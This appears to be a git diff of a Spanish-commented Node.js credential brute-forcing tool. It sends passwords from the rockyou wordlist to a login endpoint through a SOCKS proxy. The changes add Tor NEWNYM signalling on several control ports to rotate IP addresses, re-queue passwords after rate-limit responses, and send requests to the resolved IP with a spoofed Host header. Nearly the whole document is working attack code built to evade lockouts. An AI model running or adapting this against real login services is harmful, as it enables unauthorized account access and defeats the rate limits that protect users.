@@ -11,26 +11,21 @@ import {hideBin} from 'yargs/helpers'
 import fs from 'fs'
 
 import { SocksProxyAgent } from 'socks-proxy-agent'
-
 import axios from 'axios'
 
 import net from 'net'
+import dns from 'dns/promises'
 
 
 
-
+    
 
 //-------------declaración de variables--------------------
 
-let wordlist_de_proxies=[]
-
-let wordlist_de_puertos=[]
-
-let port= 9052
+let control_ports=["9053","9055","9057","9059","9061"]
 
 
-
-
+const agent = new SocksProxyAgent('socks5://127.0.0.1:16379')
 
 
 
@@ -50,11 +45,18 @@ option("header",{type:"string",default:"application/json"})
 
 .option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})
 
-.option("error",{type:"string",default:"error"}).parseSync()
+.option("error",{type:"string",default:"error"})
+.options("proxies",{type:"number",default:5}).parseSync()
 
 
 
 let url= yarg.url || "https://login-de-pruebas-1.onrender.com/login"
+
+const objURL= new URL(url)
+
+const ip= await dns.lookup(objURL.hostname)
+
+let urlfinal= `https://${ip.address}${objURL.pathname}`
 
 
 
@@ -63,7 +65,7 @@ let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")
 
 
 let body=JSON.parse(yarg.body)
-
+    
 
 
 let num_de_peticiones=0
@@ -98,15 +100,16 @@ let a=0
 
 
 
-async function worker(proxie){let i=0; 
+async function worker(){let i=0; 
 
     
 
-    while(i<yarg.n){try{let contraseña= wordlist.shift(); Object.keys(body)[1]= contraseña
+    while(i<yarg.n){try{let contraseña= wordlist.shift(); const keys = Object.keys(body);
+body[keys[1]] = contraseña; 
 
        
 
-            axios.post(url,body,{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})
+            axios.post(urlfinal,body,{httpAgent:agent,httpsAgent:agent,headers:{"Content-Type":header,'Host':objURL.hostname}})
 
      .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
 
@@ -128,66 +131,46 @@ async function worker(proxie){let i=0;
 
 
 
-while(port<=9060){
-
-    let agent= new SocksProxyAgent(`socks5://127.0.0.1:${port}`,{keepAlive:false})
-
-    wordlist_de_proxies.push(agent); wordlist_de_puertos.push(port)
-
-    port=port+2}
 
 
 
-   let ID1=  setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID1)}
-
-        console.log("puertos:",wordlist_de_puertos.length)
-
-    for(let puerto of wordlist_de_puertos){
-
-        let socket = new net.Socket();
-
-        socket.connect(puerto+1,"127.0.0.1",function(){
-
-
-
-            socket.write('AUTHENTICATE ""\r\n');
-
-            socket.on("data",function(data){
-
-                let response= data.toString()
-
-                    if (response.includes('250')) {
-
-                        socket.write('SIGNAL NEWNYM\r\n');}
-
-                        else{socket.destroy()}
-
-            })
-
-            socket.on("error",function(data){console.log(data.toString());  socket.write('QUIT\r\n'); socket.destroy()})})
-
-    }
-
-
-
-    }, 10000);
-
+  
 
 
     
 
    let ID2= setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID2); process.exit()}
-
-          for(let proxie of wordlist_de_proxies){
-
-      promesas.push(worker(proxie))
-
-    }
+    let a=0
+    while(a<5){++a; worker()}
 
 
 
-    await Promise.all(promesas); console.log("proxies:",wordlist_de_proxies.length); promesas=[]
+    
 
     }, 5000);
+
+
+    let ID1= setInterval(() => {
+        for (let ports of control_ports){
+            const socket= net.connect(ports,"127.0.0.1")
+
+            socket.on('connect', () => {
+            socket.write('AUTHENTICATE ""\r\n');
+            
+            socket.on('data', (data) => {
+                const response = data.toString();
+                if (response.includes('250')) {
+                    socket.write('SIGNAL NEWNYM\r\n');
+                    
+                    socket.on('data', (data2) => {
+                        if (data2.toString().includes('250')) {
+                            socket.destroy();
+                        }
+                    });
+                }
+            });
+        });
+        }
+    }, 15000);
 
        
